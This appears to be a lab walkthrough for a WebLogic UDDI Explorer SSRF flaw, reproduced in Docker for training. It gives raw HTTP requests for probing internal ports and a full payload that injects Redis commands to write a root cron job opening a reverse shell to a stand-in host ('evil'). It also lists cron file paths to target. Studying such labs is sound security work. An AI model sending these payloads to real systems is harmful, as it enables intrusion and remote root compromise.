# Weblogic UDDI Explorer SSRF Vulnerability

> [中文文档](README.md)

| Attribute | Details |
|-----------|---------|
| **Vulnerability ID** | Weblogic SSRF Vulnerability |
| **Affected Versions** | Oracle WebLogic Server |
| **Vulnerability Type** | Server-Side Request Forgery (SSRF) |
| **Severity** | 🔴 High |
| **Default Port** | 7001 |

`Oracle WebLogic Server` is a Java-based enterprise application server. There exists a Server-Side Request Forgery (SSRF) vulnerability in the UDDI Explorer component of WebLogic. Attackers can exploit this vulnerability to send arbitrary HTTP requests, potentially enabling internal network reconnaissance or attacking vulnerable services such as Redis.

## References

- [VulHub - Weblogic SSRF](https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf)
- [What is Server-Side Request Forgery (SSRF)?](https://foxglovesecurity.com/2015/11/06/what-is-server-side-request-forgery-ssrf/)
- [A New Era Of SSRF - Black Hat](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf)

## Environment Setup

Start the WebLogic server with the following command:

```
docker compose up -d
```

After the service starts, access `http://your-ip:7001/uddiexplorer/` to view the UDDI Explorer application. No authentication is required.


## Vulnerability Reproduction

The SSRF vulnerability exists in the `SearchPublicRegistries.jsp` page. We can use Burp Suite to send requests to `http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp` to test this vulnerability.

First, try accessing an internal service such as `http://127.0.0.1:7001`:

```
GET /uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://127.0.0.1:7001 HTTP/1.1
Host: localhost
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
```

When accessing an available port, you will receive an error response with a status code. If accessing a non-HTTP protocol, it will return "did not have a valid SOAP content-type" error.

![Docker Container Status](https://static.nextcyber.cn/attachments/images/course/task/33359e9400d945a686263c1e75730555.png)

When accessing a non-existent port, the response will show "could not connect over HTTP to server".

![HTTP Response](https://static.nextcyber.cn/attachments/images/course/task/43e7b882ae8a4743894badbe214f1c0f.png)

By analyzing these different error messages, we can effectively probe the internal network status.

### Redis Reverse Shell Exploitation

A notable feature of WebLogic's SSRF vulnerability is that despite being a GET request, we can inject newline characters by passing `%0a%0d`. Since services like Redis use newline characters to separate commands, we can exploit this characteristic to attack Redis servers in the internal network.

First, scan for Redis servers in the internal network (Docker networks typically use the 172.* subnet) and find that `172.18.0.2:6379` is accessible:

![HTTP Response](https://static.nextcyber.cn/attachments/images/course/task/1562b5d8e42449aa9b58b913bcf682ba.png)

Then, we can send three Redis commands to write a shell script to `/etc/crontab`:

```
set 1 "\n\n\n\n0-59 0-23 1-31 1-12 0-6 root bash -c 'sh -i >& /dev/tcp/evil/21 0>&1'\n\n\n\n"
config set dir /etc/
config set dbfilename crontab
save
```

URL-encode these commands:

```
set%201%20%22%5Cn%5Cn%5Cn%5Cn0-59%200-23%201-31%201-12%200-6%20root%20bash%20-c%20%27sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fevil%2F21%200%3E%261%27%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave
```

Send the encoded payload via the SSRF vulnerability:

```
GET /uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://172.19.0.2:6379/test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn0-59%200-23%201-31%201-12%200-6%20root%20bash%20-c%20%27sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fevil%2F21%200%3E%261%27%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa HTTP/1.1
Host: localhost
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
```

![Redis Service Scan](https://static.nextcyber.cn/attachments/images/course/task/47c04bf794574eb59da746b89c783644.png)

Successfully obtaining the `shell`.

![Reverse Shell](https://static.nextcyber.cn/attachments/images/course/task/332745253b0142e3b60726878e58304d.png)

Note that the exploitable cron locations include:

- `/etc/crontab` (system default cron task file)
- `/etc/cron.d/*` (system cron task directory)
- `/var/spool/cron/root` (root user's cron task file on CentOS)
- `/var/spool/cron/crontabs/root` (root user's cron task file on Debian)

## Practice Lab

前往 [NextCyber Lab](https://app.nextcyber.cn/courses/162) 在线实战演练此漏洞。

---

> ⚠️ **Disclaimer**: All content in this directory is for learning and research purposes only. Please do not use it for illegal activities.
